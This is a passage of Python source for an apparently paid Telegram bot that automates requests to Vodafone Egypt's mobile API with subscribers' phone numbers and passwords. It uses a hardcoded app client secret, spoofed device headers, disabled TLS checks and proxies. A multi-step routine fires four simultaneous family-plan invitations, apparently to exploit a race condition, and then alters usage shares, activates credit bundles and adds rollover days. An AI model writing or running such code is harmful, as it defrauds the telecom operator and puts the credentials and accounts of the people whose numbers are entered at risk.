# ════════════════════════════════════════════════════════════════
# 🔗 Service: عملية متعددة (Multi-step 6-step process)
# ════════════════════════════════════════════════════════════════

async def _tafyeer_step(session, owner, owner_pass, member, pct, uid, stop_ev, step_num):
    MAX_AUTO = 10
    auto_retries = 0
    attempt = 1
    print(f"[TAFYEER_STEP-{step_num}] 🚀 Start owner={owner} member={member} pct={pct}")
    while not stop_ev.is_set():
        tokens = await get_tokens(session, owner, owner_pass, 4)
        if stop_ev.is_set():
            return False
        print(f"[TAFYEER_STEP-{step_num}] Got {len(tokens)}/4 tokens (retry {auto_retries})")
        if len(tokens) < 4:
            auto_retries += 1
            if auto_retries < MAX_AUTO:
                safe_send(uid, f"⚠️ محاولة {auto_retries}/{MAX_AUTO} — فشل الحصول على التوكنات...", parse_mode="Markdown")
                if await interruptible_sleep(DELAY_BETWEEN_RETRIES, stop_ev):
                    return False
                continue
            retry = await ask_retry(uid, step_num, stop_ev)
            if retry is False:
                return False
            if retry == "skip":
                return "skip"
            auto_retries = 0
            attempt += 1
            continue

        await asyncio.sleep(DELAY_AFTER_LOGIN)
        successful, failed = await send_4_inv(session, tokens, owner, member, pct, attempt, stop_ev)
        if stop_ev.is_set():
            return False
        ok_tids = [tid for tid, _ in successful]
        lines = "".join(f"  {'✅' if i+1 in ok_tids else '❌'} {i+1}\n" for i in range(4))
        safe_send(uid, f"📊 *محاولة {auto_retries+1}/{MAX_AUTO} — الخطوة {step_num}:*\n{lines}نجح: *{len(successful)}/4*", parse_mode="Markdown")
        print(f"[TAFYEER_STEP-{step_num}] Attempt {auto_retries+1}: successful={successful} failed={failed}")

        if len(successful) >= 2:
            print(f"[TAFYEER_STEP-{step_num}] ✅ SUCCESS (>=2 invitations)")
            return True
        if len(successful) == 1:
            safe_send(uid, "⚠️ نجحت دعوة واحدة فقط — جاري تنظيف الدعوة المعلقة قبل إعادة المحاولة...")
            cleanup = await cleanup_pending_invitations_with_retry(
                session, owner, owner_pass, member, successful, stop_ev
            )
            if stop_ev.is_set():
                return False
            if all(r[1] for r in cleanup):
                safe_send(uid, "🧹 تم التنظيف — سيُعاد المحاولة...")
            else:
                safe_send(uid, "⚠️ فشل التنظيف — سيُعاد المحاولة على أي حال...")
            # ✅ لا نرجع False هنا — نكمل المحاولات التلقائية

        auto_retries += 1
        if auto_retries < MAX_AUTO:
            safe_send(uid, f"🔄 إعادة تلقائية {auto_retries}/{MAX_AUTO}...", parse_mode="Markdown")
            if await interruptible_sleep(DELAY_BETWEEN_RETRIES, stop_ev):
                return False
            continue

        retry = await ask_retry(uid, step_num, stop_ev)
        if retry is False:
            return False
        if retry == "skip":
            return "skip"
        auto_retries = 0
        attempt += 1
    return False

async def _run_multi_step(o1, op1, o2, op2, m1, mp1, m2, mp2, uid):
    stop_ev = get_user_stop_event(uid)
    stop_ev.clear()
    start_op(uid, "عملية متعددة", o1)
    init_progress(uid, "عملية متعددة",
                  ["الخطوة 1: دعوة M1 من O1",
                   "الخطوة 2: تطيير M1 من O2",
                   "الخطوة 3: قبول دعوة M1",
                   "الخطوة 4: تغيير نسبة M1 إلى 40%",
                   "الخطوة 5: تطيير M2 من O1 + قبول",
                   "الخطوة 6: تغيير نسبة M2 إلى 40%"])
    safe_send(uid, "🚀 *بدأت العملية...*", parse_mode="Markdown", reply_markup=op_kb(uid))
    connector = _make_connector()
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            # ── Step 1 ──────────────────────────────────────────
            set_progress(uid, "الخطوة 1: دعوة M1 من O1", "running")
            while not stop_ev.is_set():
                safe_send(uid, "⏳ *الخطوة 1 من 6*", parse_mode="Markdown")
                toks = await get_tokens(session, o1, op1, 1)
                if not toks:
                    r1 = await ask_retry(uid, "1", stop_ev)
                    if r1 is False:
                        set_progress(uid, "الخطوة 1: دعوة M1 من O1", "fail")
                        return
                    if r1 == "skip":
                        set_progress(uid, "الخطوة 1: دعوة M1 من O1", "skip")
                        break
                    continue
                ok_res = await add_family_member_async(session, toks[0], o1, m1, "10", 1, 1, stop_ev)
                ok = ok_res[0]
                if ok:
                    safe_send(uid, "✅ *الخطوة 1 اكتملت*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 1: دعوة M1 من O1", "done")
                    break
                r1 = await ask_retry(uid, "1", stop_ev)
                if r1 is False:
                    set_progress(uid, "الخطوة 1: دعوة M1 من O1", "fail")
                    return
                if r1 == "skip":
                    set_progress(uid, "الخطوة 1: دعوة M1 من O1", "skip")
                    break
            if await interruptible_sleep(20, stop_ev):
                return

            # ── Step 2 ──────────────────────────────────────────
            set_progress(uid, "الخطوة 2: تطيير M1 من O2", "running")
            safe_send(uid, "⏳ *الخطوة 2 من 6*", parse_mode="Markdown")
            step2 = await _tafyeer_step(session, o2, op2, m1, "10", uid, stop_ev, "2")
            if step2 is False:
                set_progress(uid, "الخطوة 2: تطيير M1 من O2", "fail")
                return
            if step2 == "skip":
                safe_send(uid, "⏭️ *تم تخطي الخطوة 2*", parse_mode="Markdown")
                set_progress(uid, "الخطوة 2: تطيير M1 من O2", "skip")
            else:
                safe_send(uid, "✅ *الخطوة 2 اكتملت*", parse_mode="Markdown")
                set_progress(uid, "الخطوة 2: تطيير M1 من O2", "done")

            # ── Step 3 (auto accept) ────────────────────────────
            set_progress(uid, "الخطوة 3: قبول دعوة M1", "running")
            while not stop_ev.is_set():
                safe_send(uid, "⏳ *الخطوة 3 من 6*", parse_mode="Markdown")
                acc = await accept_inv_auto(session, o1, m1, mp1, uid, stop_ev)
                if acc:
                    safe_send(uid, "✅ *الخطوة 3 اكتملت*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 3: قبول دعوة M1", "done")
                    break
                r3 = await ask_retry(uid, "3", stop_ev)
                if r3 is False:
                    set_progress(uid, "الخطوة 3: قبول دعوة M1", "fail")
                    return
                if r3 == "skip":
                    set_progress(uid, "الخطوة 3: قبول دعوة M1", "skip")
                    break
            if await interruptible_sleep(10, stop_ev):
                return

            # ── Step 4 ──────────────────────────────────────────
            set_progress(uid, "الخطوة 4: تغيير نسبة M1 إلى 40%", "running")
            safe_send(uid, "⏳ *الخطوة 4 من 6*", parse_mode="Markdown")
            toks4 = await get_tokens(session, o1, op1, 1)
            if not toks4:
                r4 = await ask_retry(uid, "4", stop_ev)
                if r4 is False:
                    set_progress(uid, "الخطوة 4: تغيير نسبة M1 إلى 40%", "fail")
                    return
                if r4 == "skip":
                    safe_send(uid, "⏭️ *تم تخطي الخطوة 4*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 4: تغيير نسبة M1 إلى 40%", "skip")
                    toks4 = None
            await asyncio.sleep(DELAY_AFTER_LOGIN)
            if toks4:
                c4_result = await change_pct(session, toks4[0], o1, m1, 40, uid, stop_ev, "4")
                if c4_result is True:
                    safe_send(uid, "✅ *الخطوة 4 اكتملت*\n⏳ انتظار 5 دقائق و15 ثانية...", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 4: تغيير نسبة M1 إلى 40%", "done")
                else:
                    if not stop_ev.is_set():
                        safe_send(uid, "⏭️ *تم تخطي الخطوة 4*", parse_mode="Markdown")
                        set_progress(uid, "الخطوة 4: تغيير نسبة M1 إلى 40%", "skip" if c4_result == "skip" else "fail")
            for left in range(5, 0, -1):
                if stop_ev.is_set():
                    return
                await asyncio.sleep(60)
                if left - 1 > 0:
                    safe_send(uid, f"⏳ تبقّت {left - 1} دقيقة...")
            if stop_ev.is_set():
                return
            await asyncio.sleep(15)   # الـ 20 ثانية المتبقية بعد 5 دقائق
            if stop_ev.is_set():
                return

            # ── Step 5 ──────────────────────────────────────────
            print(f"[MULTI-STEP] 🚀 Starting Step 5 for user {uid}")
            set_progress(uid, "الخطوة 5: تطيير M2 من O1 + قبول", "running")
            while not stop_ev.is_set():
                safe_send(uid, "⏳ *الخطوة 5 من 6*", parse_mode="Markdown")
                step5 = await _tafyeer_step(session, o1, op1, m2, "10", uid, stop_ev, "5")
                print(f"[MULTI-STEP] Step 5 tafyeer result: {step5}")
                if step5 is False:
                    print(f"[MULTI-STEP] ❌ Step 5 tafyeer FAILED — aborting")
                    set_progress(uid, "الخطوة 5: تطيير M2 من O1 + قبول", "fail")
                    return
                if step5 == "skip":
                    safe_send(uid, "⏭️ *تم تخطي الخطوة 5*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 5: تطيير M2 من O1 + قبول", "skip")
                    break
                print(f"[MULTI-STEP] Step 5 tafyeer OK, now accepting...")
                acc5 = await accept_inv_auto(session, o1, m2, mp2, uid, stop_ev)
                print(f"[MULTI-STEP] Step 5 accept result: {acc5}")
                if acc5:
                    safe_send(uid, "✅ *الخطوة 5 اكتملت*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 5: تطيير M2 من O1 + قبول", "done")
                    print(f"[MULTI-STEP] ✅ Step 5 COMPLETE")
                    break
                safe_send(uid, "⚠️ فشل قبول الدعوة — جاري إعادة المحاولة...", parse_mode="Markdown")
                r5 = await ask_retry(uid, "5", stop_ev)
                if r5 is False:
                    set_progress(uid, "الخطوة 5: تطيير M2 من O1 + قبول", "fail")
                    return
                if r5 == "skip":
                    safe_send(uid, "⏭️ *تم تخطي الخطوة 5*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 5: تطيير M2 من O1 + قبول", "skip")
                    break
            if await interruptible_sleep(10, stop_ev):
                return

            # ── Step 6 ──────────────────────────────────────────
            set_progress(uid, "الخطوة 6: تغيير نسبة M2 إلى 40%", "running")
            safe_send(uid, "⏳ *الخطوة 6 من 6*", parse_mode="Markdown")
            toks6 = await get_tokens(session, o1, op1, 1)
            if not toks6:
                r6 = await ask_retry(uid, "6", stop_ev)
                if r6 is False:
                    set_progress(uid, "الخطوة 6: تغيير نسبة M2 إلى 40%", "fail")
                    return
                if r6 == "skip":
                    safe_send(uid, "⏭️ *تم تخطي الخطوة 6*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 6: تغيير نسبة M2 إلى 40%", "skip")
                    toks6 = None
            await asyncio.sleep(DELAY_AFTER_LOGIN)
            if toks6:
                c6_result = await change_pct(session, toks6[0], o1, m2, 40, uid, stop_ev, "6")
                if c6_result is True:
                    safe_send(uid, "✅ *الخطوة 6 اكتملت*", parse_mode="Markdown")
                    set_progress(uid, "الخطوة 6: تغيير نسبة M2 إلى 40%", "done")
                else:
                    if not stop_ev.is_set():
                        safe_send(uid, "⏭️ *تم تخطي الخطوة 6*", parse_mode="Markdown")
                        set_progress(uid, "الخطوة 6: تغيير نسبة M2 إلى 40%", "skip" if c6_result == "skip" else "fail")

            record("عملية متعددة", True, uid)

            # ── Deduct star for star subscribers ───────────────
            sub_info = get_subscriber_info(uid)
            if sub_info and sub_info.get("sub_type") == "stars":
                if deduct_star(uid):
                    remaining = get_subscriber_stars(uid)
                    safe_send(uid, f"⭐ تم خصم نجمة واحدة | المتبقي: *{remaining}* نجمة", parse_mode="Markdown")
                else:
                    safe_send(uid, "⚠️ فشل خصم النجمة", parse_mode="Markdown")

            safe_send(uid,
                "🎉 *اكتملت العملية بنجاح!*\n\n"
                "✅ الخطوة 1\n✅ الخطوة 2\n✅ الخطوة 3\n"
                "✅ الخطوة 4\n✅ الخطوة 5\n✅ الخطوة 6\n\n"
                "⏳ انتظار 6 دقيقة قبل عرض الخدمات الإضافية...",
                parse_mode="Markdown", reply_markup=main_kb(uid))

            # ── Wait 20m then offer nota15 ───────────────────
            safe_send(uid, "⏳ انتظار 5 دقائق و15 ثانية...")
            for left in range(5, 0, -1):
                if stop_ev.is_set():
                    return
                await asyncio.sleep(60)
                if left - 1 > 0:
                    safe_send(uid, f"⏳ تبقّت {left - 1} دقيقة...")
            if stop_ev.is_set():
                return
            await asyncio.sleep(15)
            if stop_ev.is_set():
                return

            mk_nota = types.InlineKeyboardMarkup()
            mk_nota.add(
                types.InlineKeyboardButton("✅ نعم، فعّل النوتة", callback_data=f"post_nota_yes_{uid}"),
                types.InlineKeyboardButton("❌ لا، شكراً", callback_data=f"post_nota_no_{uid}"),
            )
            safe_send(uid, "📦 *هل تريد تفعيل نوتة فليكس 15 على رقم Owner1 الآن؟*", parse_mode="Markdown", reply_markup=mk_nota)

            nota_decision = None
            for _ in range(600):
                if stop_ev.is_set():
                    return
                val = pop_accept_resp(uid)
                if val is not None:
                    nota_decision = val
                    break
                await asyncio.sleep(1)

            if nota_decision is True:
                nota_done = False
                while not nota_done and not stop_ev.is_set():
                    safe_send(uid, "⏳ جاري تفعيل نوتة فليكس 15 على Owner1...")
                    def _do_nota():
                        return svc_nota15(o1, op1)
                    ok, msg = await asyncio.get_running_loop().run_in_executor(None, _do_nota)
                    if ok:
                        record("نوتة فليكس 15", True, uid)
                        safe_send(uid, msg)
                        nota_done = True
                    else:
                        record("نوتة فليكس 15", False, uid)
                        safe_send(uid, f"❌ فشل تفعيل النوتة: {msg}")
                        retry = await ask_retry(uid, "النوتة", stop_ev)
                        if retry is False or retry == "skip":
                            safe_send(uid, "⏭️ تم تخطي تفعيل النوتة.")
                            break

                # ── Wait 20m then offer rollover ──────────────
                safe_send(uid, "⏳ انتظار 5 دقائق و15 ثانية قبل خدمة تزويد الأيام...")
                for left in range(5, 0, -1):
                    if stop_ev.is_set():
                        return
                    await asyncio.sleep(60)
                    if left - 1 > 0:
                        safe_send(uid, f"⏳ تبقّت {left - 1} دقيقة...")
                if stop_ev.is_set():
                    return
                await asyncio.sleep(15)
                if stop_ev.is_set():
                    return

                mk_roll = types.InlineKeyboardMarkup()
                mk_roll.add(
                    types.InlineKeyboardButton("✅ نعم، زوّد الأيام", callback_data=f"post_roll_yes_{uid}"),
                    types.InlineKeyboardButton("❌ لا، شكراً", callback_data=f"post_roll_no_{uid}"),
                )
                safe_send(uid,
                    "📅 *هل تريد تزويد الأيام على الأرقام الثلاثة؟*\n"
                    f"• Owner1: `{o1}`\n• الفرد الأول: `{m1}`\n• الفرد الثاني: `{m2}`",
                    parse_mode="Markdown", reply_markup=mk_roll)

                roll_decision = None
                for _ in range(600):
                    if stop_ev.is_set():
                        return
                    val = pop_accept_resp(uid)
                    if val is not None:
                        roll_decision = val
                        break
                    await asyncio.sleep(1)

                if roll_decision is True:
                    for label, number, password in [
                        (f"Owner1 `{o1}`", o1, op1),
                        (f"الفرد الأول `{m1}`", m1, mp1),
                        (f"الفرد الثاني `{m2}`", m2, mp2),
                    ]:
                        safe_send(uid, f"⏳ جاري تزويد الأيام لـ {label}...", parse_mode="Markdown")
                        n, p = number, password
                        def _do_roll(nn=n, pp=p, lb=label):
                            ok_r, msg_r = svc_rollover(nn, pp)
                            record("تزويد أيام", ok_r, uid)
                            safe_send(uid, f"{'✅' if ok_r else '❌'} {lb}: {msg_r}", parse_mode="Markdown")
                        await asyncio.get_running_loop().run_in_executor(None, _do_roll)
                        await asyncio.sleep(3)

                    # ── After rollover: offer nota renewal ──────
                    mk_renew = types.InlineKeyboardMarkup()
                    mk_renew.add(
                        types.InlineKeyboardButton("✅ تأكيد تفعيل النوتة", callback_data=f"post_renew_yes_{uid}"),
                        types.InlineKeyboardButton("❌ لا، شكراً", callback_data=f"post_renew_no_{uid}"),
                    )
                    safe_send(uid,
                        "📦 *هل تريد تفعيل نوتة جديدة على Owner1؟*\n\n"
                        "⚠️ *ملاحظة:* يجب شحن رصيد *20 جنيه صافي* على الخط لتسديد النوتة السابقة.",
                        parse_mode="Markdown", reply_markup=mk_renew)

                    renew_decision = None
                    for _ in range(600):
                        if stop_ev.is_set():
                            return
                        val = pop_accept_resp(uid)
                        if val is not None:
                            renew_decision = val
                            break
                        await asyncio.sleep(1)

                    if renew_decision is True:
                        renew_done = False
                        while not renew_done and not stop_ev.is_set():
                            safe_send(uid, "⏳ جاري تفعيل النوتة الجديدة...")
                            def _do_renew():
                                return svc_nota15(o1, op1)
                            ok_rn, msg_rn = await asyncio.get_running_loop().run_in_executor(None, _do_renew)
                            if ok_rn:
                                record("نوتة فليكس 15", True, uid)
                                safe_send(uid, msg_rn)
                                renew_done = True
                            else:
                                record("نوتة فليكس 15", False, uid)
                                safe_send(uid, f"❌ فشل تفعيل النوتة الجديدة: {msg_rn}")
                                retry_rn = await ask_retry(uid, "النوتة الجديدة", stop_ev)
                                if retry_rn is False or retry_rn == "skip":
                                    safe_send(uid, "⏭️ تم تخطي تفعيل النوتة.")
                                    break

                    safe_send(uid, "🎉 *انتهت جميع الخدمات!*\n\nاضغط /start لعملية جديدة.",
                              parse_mode="Markdown", reply_markup=main_kb(uid))
                else:
                    safe_send(uid, "✅ *تم الانتهاء.*\n\nاضغط /start لعملية جديدة.",
                              parse_mode="Markdown", reply_markup=main_kb(uid))
            else:
                safe_send(uid, "✅ *اكتملت العملية.*\n\nاضغط /start لعملية جديدة.",
                          parse_mode="Markdown", reply_markup=main_kb(uid))

    except Exception as e:
        safe_send(uid, f"❌ خطأ غير متوقع: {e}")
        record("عملية متعددة", False, uid)
        print(traceback.format_exc())
    finally:
        if stop_ev.is_set():
            record("عملية متعددة", False, uid)
            safe_send(uid, "🛑 *تم إيقاف العملية.*\n\nاضغط /start لعملية جديدة.",
                      parse_mode="Markdown", reply_markup=main_kb(uid))
        pop_user_stop_event(uid)
        end_op(uid)
        clear_progress(uid)

def multi_step_thread(o1, op1, o2, op2, m1, mp1, m2, mp2, uid):
    print(f"[MULTI] Thread started for user {uid}")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_run_multi_step(o1, op1, o2, op2, m1, mp1, m2, mp2, uid))
    except Exception as e:
        print(f"[MULTI] ❌ Thread crashed for user {uid}: {e}")
        traceback.print_exc()
        try:
            safe_send(uid, f"❌ خطأ في العملية: {e}", parse_mode="Markdown", reply_markup=main_kb(uid))
        except Exception:
            pass
        record("عملية متعددة", False, uid)
    finally:
        loop.close()
        print(f"[MULTI] Thread ended for user {uid}")

# ════════════════════════════════════════════════════════════════
# 📦 Blocking service functions (requests-based)
# ════════════════════════════════════════════════════════════════
def _proxies():
    return {"http": PROXY_URL, "https": PROXY_URL} if USE_PROXY else None

def _do_login(number, password):
    data = {
        "username": number, "password": password, "grant_type": "password",
        "client_id": "ana-vodafone-app",
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
    }
    headers = {
        "Accept": "application/json, text/plain, */*", "Connection": "keep-alive",
        "silentLogin": "true", "x-agent-operatingsystem": "13",
        "clientId": "AnaVodafoneAndroid", "Accept-Language": "en",
        "x-agent-device": "Xiaomi M2102J20SG", "x-agent-version": "2025.11.1",
        "x-agent-build": "1063", "digitalId": "244BQYOGFM0IM",
        "device-id": "b83aab2d8fa633da", "Content-Type": "application/x-www-form-urlencoded",
        "Host": "mobile.vodafone.com.eg", "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0",
    }
    r = requests.post(AUTH_URL, data=data, headers=headers, timeout=15, proxies=_proxies(), verify=False)
    if r.status_code != 200:
        raise Exception(f"فشل تسجيل الدخول ({r.status_code})")
    return r.json()["access_token"]

def svc_eligibility(number, password, bundle_id):
    token = _do_login(number, password)
    params = {
        "$.relatedParty.id": number,
        "$.productOfferingQualificationItem.product.id": bundle_id,
        "@type": "FlexACP",
    }
    headers = {
        "User-Agent": "okhttp/4.12.0", "Connection": "Keep-Alive",
        "Accept": "application/json", "Accept-Encoding": "gzip",
        "Authorization": f"Bearer {token}", "api-version": "v2",
        "device-id": "b83aab2d8fa633da", "x-agent-operatingsystem": "13",
        "clientId": "AnaVodafoneAndroid", "x-agent-device": "Xiaomi M2102J20SG",
        "x-agent-version": "2026.2.3", "x-agent-build": "1117", "msisdn": number,
        "Content-Type": "application/json", "Accept-Language": "ar",
    }
    r = requests.get(ELIGIBILITY_URL, params=params, headers=headers, timeout=15, proxies=_proxies(), verify=False)
    try:
        r.json()["productOfferingQualificationItem"][0]["product"]["encProductId"]
        return True, "✅ خطك مؤهل"
    except Exception:
        try:
            reason = r.json().get("reason", r.json().get("message", "الخط غير مؤهل"))
            return False, f"❌ {reason}"
        except Exception:
            return False, "❌ الخط غير مؤهل"

def svc_nota_all(number, password, bundle):
    token = _do_login(number, password)
    params = {
        "$.relatedParty.id": number,
        "$.productOfferingQualificationItem.product.id": bundle["id"],
        "@type": "FlexACP",
    }
    hdrs_e = {
        "User-Agent": "okhttp/4.12.0", "Connection": "Keep-Alive",
        "Accept": "application/json", "Accept-Encoding": "gzip",
        "Authorization": f"Bearer {token}", "api-version": "v2",
        "device-id": "b83aab2d8fa633da", "x-agent-operatingsystem": "13",
        "clientId": "AnaVodafoneAndroid", "x-agent-device": "Xiaomi M2102J20SG",
        "x-agent-version": "2026.2.3", "x-agent-build": "1117", "msisdn": number,
        "Content-Type": "application/json", "Accept-Language": "ar",
    }
    r = requests.get(ELIGIBILITY_URL, params=params, headers=hdrs_e, timeout=15, proxies=_proxies(), verify=False)
    try:
        enc = r.json()["productOfferingQualificationItem"][0]["product"]["encProductId"]
    except Exception:
        try:
            reason = r.json().get("reason", "الخط غير مؤهل")
            return False, f"❌ {reason}"
        except Exception:
            return False, "❌ الخط غير مؤهل"

    payload = {
        "payment": [{"characteristics": [], "@type": "ACP"}],
        "productOrderItem": [{
            "characteristics": [
                {"name": "MSISDN", "@type": "receiver", "value": "2" + number},
                {"name": "MSISDN", "@type": "sender", "value": "2" + number},
            ],
            "itemTotalPrice": [{"price": {"taxIncludedAmount": {"unit": "EGP", "value": bundle["price"]}}}],
            "product": {
                "id": bundle["id"],
                "productCharacteristic": [{"@type": "token", "value": enc, "valueType": "string"}],
                "type": "product",
            },
        }],
        "@type": "paymentFlex",
    }
    hdrs_a = {
        "User-Agent": "okhttp/4.12.0", "Connection": "Keep-Alive",
        "Accept": "application/json", "Accept-Encoding": "gzip",
        "Authorization": f"Bearer {token}", "api-version": "v2",
        "device-id": "b83aab2d8fa633da", "x-agent-operatingsystem": "13",
        "clientId": "AnaVodafoneAndroid", "x-agent-device": "Xiaomi M2102J20SG",
        "x-agent-version": "2026.2.3", "x-agent-build": "1117", "msisdn": number,
        "Accept-Language": "ar", "Content-Type": "application/json; charset=UTF-8",
    }
    ra = requests.post(ORDER_URL_MOBILE, data=json.dumps(payload), headers=hdrs_a, timeout=15, proxies=_proxies(), verify=False)
    try:
        j = ra.json()
        if ("code" in j and j["code"] == "2255") or j.get("status") == "success" or "orderId" in j:
            return True, f"✅ تم تفعيل {bundle['name']} بنجاح!"
        if ra.status_code == 200:
            return True, f"✅ تم تفعيل {bundle['name']} بنجاح!"
        return False, "❌ فشل التفعيل"
    except Exception:
        return False, "❌ استجابة غير متوقعة"

def svc_nota15(number, password):
    def _lg15():
        pl = {
            "grant_type": "password", "username": number, "password": password,
            "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            "client_id": "ana-vodafone-app",
        }
        hdrs = {
            "User-Agent": "okhttp/4.11.0", "Accept": "application/json",
            "Accept-Encoding": "gzip", "silentLogin": "false",
            "x-agent-operatingsystem": "15", "Accept-Language": "ar",
            "x-agent-device": "HONOR ALI-NX1", "x-agent-version": "2025.11.1.1",
        }
        r = requests.post(AUTH_URL, data=pl, headers=hdrs, timeout=15, proxies=_proxies(), verify=False)
        r.raise_for_status()
        return r.json()["access_token"]

    def _act(tok):
        hdrs = {
            "api-host": "ProductOrderingManagement", "useCase": "FlexACPRenewal",
            "Authorization": f"Bearer {tok}", "api-version": "v2",
            "x-agent-operatingsystem": "16", "clientId": "AnaVodafoneAndroid",
            "x-agent-version": "2026.1.1", "x-agent-build": "1100", "msisdn": number,
            "Accept": "application/json", "Accept-Language": "en",
            "Content-Type": "application/json; charset=UTF-8",
            "Host": "mobile.vodafone.com.eg", "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip", "User-Agent": "okhttp/4.11.0",
        }
        pl = {
            "channel": {"name": "MobileApp"},
            "orderItem": [{
                "action": "insert", "id": BUNDLE_NOTA15["target"],
                "product": {
                    "characteristic": [
                        {"name": "PaymentMethod", "value": "ACP"},
                        {"name": "ACP", "value": "True"},
                    ],
                    "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}],
                },
                "eCode": 0,
            }],
            "@type": "FlexACPRenewal",
        }
        for _ in range(3):
            r = requests.post(ORDER_URL_POM, json=pl, headers=hdrs, timeout=15, proxies=_proxies(), verify=False)
            if r.status_code == 500:
                try:
                    if r.json().get("code") == "3999":
                        return True
                except Exception:
                    pass
            time.sleep(3)
        return False

    def _enc(tok):
        params = {"relatedParty.id": number, "@type": "FlexProfile"}
        hdrs = {
            "User-Agent": "okhttp/4.12.0", "Connection": "Keep-Alive",
            "Accept": "application/json", "Accept-Encoding": "gzip",
            "api-host": "ProductInventoryManagementHost", "useCase": "FlexProfile",
            "Authorization": f"Bearer {tok}", "api-version": "v2", "device-id": "b8a",
            "x-agent-operatingsystem": "13", "clientId": "AnaVodafoneAndroid",
            "x-agent-device": "Xiaomi", "x-agent-version": "2026.2.3",
            "x-agent-build": "1117", "msisdn": number,
            "Content-Type": "application/json", "Accept-Language": "ar",
        }
        r = requests.get("https://mobile.vodafone.com.eg/services/dxl/pim/product",
                         params=params, headers=hdrs, timeout=15, proxies=_proxies(), verify=False)
        r.raise_for_status()
        for p in r.json():
            if p.get("id") == BUNDLE_NOTA15["id"]:
                e = p.get("productOffering", {}).get("encProductId")
                if e:
                    return e
        raise Exception("لم يُعثر على enc")

    def _renew(tok, enc):
        pl = {
            "channel": {"name": "MobileApp"},
            "orderItem": [{"action": "repurchase", "product": {
                "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}],
                "id": BUNDLE_NOTA15["id"], "encProductId": enc,
            }}],
            "@type": "FlexRenew",
        }
        hdrs = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "application/json", "Content-Type": "application/json",
            "Authorization": f"Bearer {tok}", "Accept-Language": "AR",
            "msisdn": number, "clientId": "WebsiteConsumer",
            "Origin": "https://web.vodafone.com.eg",
            "Referer": "https://web.vodafone.com.eg/spa/flexManagement/usage",
        }
        r = requests.post(ORDER_URL_WEB, json=pl, headers=hdrs, timeout=15, proxies=_proxies(), verify=False)
        if r.status_code == 201:
            try:
                j = r.json()
                if j.get("state") == "Completed" and isinstance(j.get("orderTotalPrice"), list):
                    return True
            except Exception:
                pass
        return False

    try:
        tok = _lg15()
        if not _act(tok):
            return False, "❌ فشل تفعيل النوتة (مرحلة ACP)"
        enc = _enc(tok)
        return (True, "✅ تم تفعيل نوتة فليكس 15 بنجاح!") if _renew(tok, enc) else (False, "❌ فشل تجديد النوتة")
    except Exception as e:
        return False, f"❌ خطأ: {e}"

def svc_rollover(number, password):
    try:
        token = _do_login(number, password)
    except Exception as e:
        return False, f"❌ فشل تسجيل الدخول: {e}"
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{"action": "add", "product": {
            "characteristic": [
                {"name": "LangId", "value": "en"},
                {"name": "ExecutionType", "value": "Sync"},
            ],
            "id": "FLEX_ROLLOVER",
            "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}],
        }}],
        "@type": "AllInOneOffer",
    }
    headers = {
        "User-Agent": "okhttp/4.12.0", "Connection": "Keep-Alive",
        "Accept": "application/json", "Accept-Encoding": "gzip",
        "Authorization": f"Bearer {token}", "api-version": "v2",
        "device-id": "ba4068643748bc78", "x-agent-operatingsystem": "15",
        "clientId": "AnaVodafoneAndroid", "x-agent-device": "HONOR ALI-NX1",
        "x-agent-version": "2025.11.1.1", "x-agent-build": "1064", "msisdn": number,
        "Accept-Language": "ar", "Content-Type": "application/json; charset=UTF-8",
    }
    try:
        r = requests.post(ORDER_URL_POM, json=payload, headers=headers, timeout=40, proxies=_proxies(), verify=False)
        try:
            data = r.json()
        except Exception:
            return False, "❌ فشل تزويد الأيام"
        if (isinstance(data, dict) and data.get("state") == "Completed"
                and isinstance(data.get("orderTotalPrice"), list)):
            return True, "✅ تم تزويد الأيام بنجاح!"
        return False, "❌ فشل تزويد الأيام"
    except requests.exceptions.Timeout:
        return False, "❌ انتهت مهلة الاتصال"
    except Exception as e:
        return False, f"❌ خطأ: {e}"

# ════════════════════════════════════════════════════════════════
# 🤖 Telegram Handlers — Commands
# ════════════════════════════════════════════════════════════════
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    uid = msg.chat.id
    with _users_seen_lock:
        users_seen.add(uid)
    register_user(uid)

    access = check_access(uid)
    if access != "ok":
        send_no_access_msg(uid)
        return

    stop_ev = get_user_stop_event(uid)
    stop_ev.set()
    clear_user_state(uid)

    safe_send(uid, "👋 *أهلاً بك!*\n\nاختر الخدمة:", parse_mode="Markdown", reply_markup=main_kb(uid))

@bot.message_handler(commands=["admin"])
def cmd_admin(msg):
    uid = msg.chat.id
    if not is_admin(uid):
        return
    safe_send(uid, admin_dashboard(), parse_mode="Markdown", reply_markup=admin_inline_kb())

# ════════════════════════════════════════════════════════════════
# 🤖 Callback handlers
# ════════════════════════════════════════════════════════════════

# ── Stop fly ───────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "stop_fly")
def cb_stop_fly(call):
    uid = call.message.chat.id
    stop_ev = get_user_stop_event(uid)
    if not stop_ev.is_set():
        stop_ev.set()
        try:
            bot.answer_callback_query(call.id, "🛑 جاري الإيقاف...")
        except Exception:
            pass
        try:
            bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
        except Exception:
            pass
    else:
        try:
            bot.answer_callback_query(call.id, "⚠️ لا توجد عملية نشطة")
        except Exception:
            pass

# ── Stop multi ─────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "stop_multi")
def cb_stop_multi(call):
    uid = call.message.chat.id
    stop_ev = get_user_stop_event(uid)
    if not stop_ev.is_set():
        stop_ev.set()
        try:
